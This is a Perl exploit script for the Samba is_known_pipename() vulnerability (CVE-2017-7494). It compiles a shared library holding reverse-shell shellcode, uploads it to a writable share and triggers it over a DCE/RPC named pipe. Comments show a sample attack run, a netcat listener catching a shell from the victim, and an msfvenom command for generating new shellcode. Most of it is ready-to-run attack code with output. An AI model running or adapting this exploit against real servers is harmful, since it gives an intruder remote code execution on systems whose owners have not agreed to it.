#!/usr/bin/perl -w

#Remote Samba is_known_pipename() (  3.5.0 to 4.4.14, 4.5.10, and 4.6.4.) Exploit By N_A , N_A[at]tutanota.com

#The orginal bug was discovered by steelo <knownsteelo[at]gmail.com>
#CVE-2017-7494
#https://www.samba.org/samba/security/CVE-2017-7494.html

#Tested on Samba 4.5.8-Debian


#Requirments for this exploit to run:

#perl -MCPAN -e 'install Filesys::SmbClientParser'
#git clone https://github.com/CoreSecurity/impacket and then install the package



#How to use this exploit:

#This exploit loads a hacked library file into a vulnerable samba server and provides a reverse shell. ( you will need to swap the shellcode )
#A writable samba share is required or valid credentials to a samba share that allows write access to the share.
#You need to know the server side location path of the writable share. For example if the share with write access is called 'blah' then you will
#need to know the full server side path i.e '/home/billybobthornton/blah'
#That is all. This exploit creates a hacked library file and loads it into the remote writable samba share and then uses the DCE/RPC protocol to 
#create a ncacn_np request to a named pipe ( the hacked library file ) and executes it. 

#The exploit uses the impacket library files by CoreSecurity to send the DCE/RPC packet. I have tried playing with Perl's DCE::Perl::RPC and did
#not have much luck with this package. Its over 10 years old and i could not find any relevant documentation to aid me in creating a valid request
#that would trigger a named pipe request. 

#If anyone knows an easier way to do this in Perl please contact me , even if its regarding wireshark captures of the DCE/RPC protocol. 
#Email me on N_A[at]tutanota.com, thank you :)



#root@kali:~/exploits# perl eternelred.pl -h 192.168.142.128 -s anonymous -l /home/NA/anonymous
#[*]No Port Specified - Using Port 445 as default
#[*]No user specified - Using 'nobody' as default user
#[*]No password specified - Leaving password blank
#[*]Using Host: 192.168.142.128 on port: 445
#[*]Username: nobody
#[*]Password: 
#[*]Attacking Share: anonymous on Host: 192.168.142.128 Port: 445
#[*]Creating Pure Evil
#[*]Evil File Created Successfully!
#Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.8-Debian]
#[*]Evil File transferred to Samba Server!
#[*]Triggering exploit
#[*]G0t r00t?




#A terminal with a netcat listener set up on port 443

#root@kali:~/exploits# nc -nlvp 443
#listening on [any] 443 ...
#connect to [192.168.142.140] from (UNKNOWN) [192.168.142.128] 36214
#sh -i;
#sh: 0: can't access tty; job control turned off
#$ id 
#uid=65534(nobody) gid=0(root) egid=65534(nogroup) groups=65534(nogroup)
#$ 





#Greetz - Listen m0use i have been busy all week, didnt i tell i was working on stuff? Relax. R-E-L-A-X. Relaaaax. 
#Greetz to the Wu-tang clan and all killabeez ;P





use POSIX;
use Filesys::SmbClientParser;
use strict;
use warnings;  
use Getopt::Long qw(GetOptions);



#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c  - change this to your own LHOST and LPORT to receive connection
#And then replace the resultant shellcode below:
#Note: Replace all double quotes " in the shellcode with single quotes ' before replacing shellcode.


my $shellcode = '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80'.
'\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x8e\x80\x68'.
'\x02\x00\x01\xbb\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1'.
'\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3'.
'\x52\x53\x89\xe1\xb0\x0b\xcd\x80';


#These are our evil files
my $evil_header ="#ifndef evil_h__\n"."#define evil_h__\n"."extern int samba_init_module(void);\n".'#endif';
my $evil ="#include <stdio.h>\n".'int samba_init_module(void){ unsigned char shellcode[]='.'"'.$shellcode.'"'.";".'(*(void(*)()) shellcode)();return 0;}';

my $evil_header_file = 'evil.h';
my $evil_file = 'evil.c';




#creating evil library , libevil.so
sub create_evil()
{
	
	open(my $fh, '>', $evil_file) or die "[*]Could not open evil.c";
	print $fh $evil;
	open($fh, '>', $evil_header_file) or die "[*]Could not open evil.h";
	print $fh $evil_header;
	close $fh;
	system("gcc -c -Wall -Werror -fpic evil.c");
	system("gcc -shared -o libevil.so evil.o");
	print "[*]Evil File Created Successfully!\n";
}	


sub usage()
{	
	print "\n\n-=[*]Remote Samba is_known_pipename() Root Exploit[*]=-\n\n"; 
	print "\t\t-=By N_A=-\n\n";
	print "[*]Usage: $0 --host hostname --port port --user user --password pass --share writable-share --location /server/side/path\n\n";
	print "[*]$0 --host 127.0.0.1 --port 445 --user nobody --password pass --share temp  --location /home/blah/temp\n";
	print "[*]$0 -h 127.0.0.1 -p 139 -u admin -pa adminpass -s stuff -l /var/samba/stuff\n\n";
	print "[*]Note: No username provided defaults to user name 'nobody'\n";
	print "[*]Note: No port provided defaults to port '445'\n";
	print "[*]Note: No password provided defaults to a blank password\n";
	exit; 
}


my $host;			#host to attack
my $port;			#port on host to attack , default is 445
my $user;			#username on host to use, default is nobody
my $password;			#password to use, default is left as blank
my $share;			#path to the writable share to use
my $location;			#this is the location on the server side of the share. We need this to access our libevil.so


GetOptions('host|h=s' => \$host, 'port|p=s' => \$port,'user|u=s' => \$user, 'password|pa=s' => \$password, 'share|s=s' => \$share, 'location|l=s' => \$location,) or die usage();



if(!$location)
{

	usage();
}

if(!$host)
{

	usage();
}


if(!$port)
{
	print "[*]No Port Specified - Using Port 445 as default\n";
	$port = 445;
}

if(!$user)
{
	print "[*]No user specified - Using 'nobody' as default user\n";
	$user = "nobody";
}

if(!$password)
{
	print "[*]No password specified - Leaving password blank\n";
	$password = "";
}


if(!$share)
{
	print "[*]Writable Share missing\n";
	usage();
}


my $smb = new Filesys::SmbClientParser
  (undef,
   (
    user     => $user,
    password => $password
   ));
 
 	
$smb->Host($host);

print "[*]Using Host: $host on port: $port\n";
print "[*]Username: $user\n";
print "[*]Password: $password\n";
print "[*]Attacking Share: $share on Host: $host Port: $port\n";
print "[*]Creating Pure Evil\n";
create_evil();

$smb->Share($share);			#Locating correct writable share

$smb->put("libevil.so");		#transferring libevil.so to the writeable share
print "[*]Evil File transferred to Samba Server!\n";
print "[*]Triggering exploit\n";
print "[*]G0t r00t?\n";

#All should be well at this point. All thats left is to trigger the exploit.
#A dirty hack below. There was not much documentation on DCE::Perl::RPC which is required to send requests to named pipes
#Using impacket from the command line, via system() call. 

my $evil_lib = '/libevil.so';
my $stringbind = "python -c 'from impacket.dcerpc.v5 import transport; st=\"$host\";stt=\"$location/libevil.so\";s=r\"ncacn_np:%s[\\pipe%s]\" % (st,stt); rpctrans = transport.DCERPCTransportFactory(s); dce = rpctrans.get_dce_rpc(); dce.connect();'";


system("$stringbind");			#triggering exploit
